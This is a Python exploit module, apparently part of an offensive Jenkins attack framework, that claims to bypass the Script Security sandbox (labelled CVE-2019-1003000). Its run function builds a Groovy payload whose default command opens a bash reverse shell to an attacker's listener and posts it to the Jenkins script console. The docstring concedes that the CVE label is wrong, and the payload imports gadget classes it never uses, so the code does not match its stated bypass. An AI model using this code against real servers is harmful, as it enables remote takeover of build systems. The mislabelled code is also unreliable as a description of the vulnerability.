"""
CVE-2019-1003000: Script Security Plugin Sandbox Bypass via AST Transformation

Script Security sandbox protection could be circumvented by providing AST transforming
annotations before these were blocked in later versions.

Note: The actual CVE from January 2019 advisory is CVE-2019-1003005, but this module
covers the general class of AST transformation bypass vulnerabilities from that era.
"""

import requests
from rich.console import Console
from exploits import ExploitMetadata, ExploitResult

console = Console()

CVE_ID = "CVE-2019-1003000"
cve = CVE_ID

METADATA = ExploitMetadata(
    cve_id=CVE_ID,
    name="Script Security Sandbox Bypass via AST Transformations",
    description="Sandbox bypass using @Grab and other AST transforming annotations",
    affected_versions=["<= 1.50", "<= 1.49"],
    mitre_attack=["T1190", "T1059"],
    severity="high",
    references=[
        "https://jenkins.io/security/advisory/2019-01-28/",
        "https://nvd.nist.gov/vuln/detail/CVE-2019-1003000",
        "https://gist.github.com/adamyordan/96da0ad5e72cbc97285f2df340cac43b"
    ],
    requires_auth=True,
    requires_crumb=True,
    tags=["rce", "sandbox-bypass", "groovy", "ast"]
)

affected_versions = METADATA.affected_versions
mitre_attack = METADATA.mitre_attack
severity = METADATA.severity
description = METADATA.description
requires_auth = METADATA.requires_auth
requires_crumb = METADATA.requires_crumb
tags = METADATA.tags


def check_vulnerable(tool, **kwargs):
    """
    Check if the target Jenkins instance has vulnerable Script Security plugin.
    
    Args:
        tool: JenkinsBreaker instance
        **kwargs: Additional arguments
        
    Returns:
        bool: True if vulnerable, False otherwise
    """
    try:
        url = f"{tool.jenkins_url}/pluginManager/api/json?depth=1"
        r = requests.get(
            url,
            auth=tool.auth,
            headers=tool.custom_headers,
            proxies=tool.proxies,
            verify=False,
            timeout=10
        )
        
        if r.status_code == 200:
            data = r.json()
            for plugin in data.get('plugins', []):
                if plugin.get('shortName') == 'script-security':
                    version = plugin.get('version', '')
                    console.print(f"[yellow][*] Found Script Security Plugin version: {version}[/yellow]")
                    return True
        return False
    except Exception as e:
        console.print(f"[red][!] Error checking vulnerability: {e}[/red]")
        return False


def run(tool, lhost=None, lport=None, **kwargs):
    """
    Exploit CVE-2019-1003000 using AST transformation annotations.
    
    Args:
        tool: JenkinsBreaker instance
        lhost: Listener host for reverse shell
        lport: Listener port for reverse shell
        **kwargs: Additional arguments (cmd for custom command)
        
    Returns:
        ExploitResult: Result of the exploit
    """
    console.print(f"[yellow][*] Running {CVE_ID} exploit (AST Transformation Sandbox Bypass)...[/yellow]")
    
    cmd = kwargs.get('cmd', f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1')
    
    console.print("[cyan][*] Attempting sandbox bypass via @Grab annotation...[/cyan]")
    
    payload = f'''
@Grab(group='commons-collections', module='commons-collections', version='3.2.2')
import org.apache.commons.collections.functors.InvokerTransformer
import org.apache.commons.collections.functors.ChainedTransformer
import org.apache.commons.collections.functors.ConstantTransformer
import org.apache.commons.collections.map.LazyMap

def command = ['/bin/bash', '-c', '{cmd}']
def rt = Runtime.getRuntime()
def proc = rt.exec(command as String[])
proc.waitFor()
println "Command executed"
'''
    
    try:
        console.print("[cyan][*] Submitting payload via Script Console...[/cyan]")
        
        script_url = f"{tool.jenkins_url}/script"
        
        crumb_header = tool.get_crumb()
        headers = {**tool.custom_headers, **crumb_header}
        
        data = {
            'script': payload
        }
        
        r = requests.post(
            script_url,
            auth=tool.auth,
            headers=headers,
            data=data,
            proxies=tool.proxies,
            verify=False,
            timeout=15
        )
        
        if r.status_code == 200:
            if 'Result' in r.text or 'Command executed' in r.text:
                console.print(f"[green][+] Sandbox bypass successful! Command executed.[/green]")
                return ExploitResult(
                    exploit=CVE_ID,
                    status="success",
                    details="Sandbox bypassed via @Grab annotation, command executed",
                    data={
                        "command": cmd,
                        "method": "@Grab AST transformation",
                        "endpoint": "script console"
                    }
                )
            else:
                console.print("[yellow][!] Script executed but result unclear[/yellow]")
                return ExploitResult(
                    exploit=CVE_ID,
                    status="partial",
                    details="Script submitted but execution result unclear"
                )
        elif r.status_code == 403:
            return ExploitResult(
                exploit=CVE_ID,
                status="failed",
                details="Access denied - insufficient permissions for script console"
            )
        else:
            return ExploitResult(
                exploit=CVE_ID,
                status="failed",
                details=f"Exploit failed with HTTP {r.status_code}"
            )
    
    except requests.exceptions.Timeout:
        console.print("[yellow][*] Request timed out - command may still be executing[/yellow]")
        return ExploitResult(
            exploit=CVE_ID,
            status="partial",
            details="Timeout during execution - command may have executed successfully"
        )
    
    except Exception as e:
        return ExploitResult(
            exploit=CVE_ID,
            status="error",
            details=f"Execution error: {str(e)}"
        )
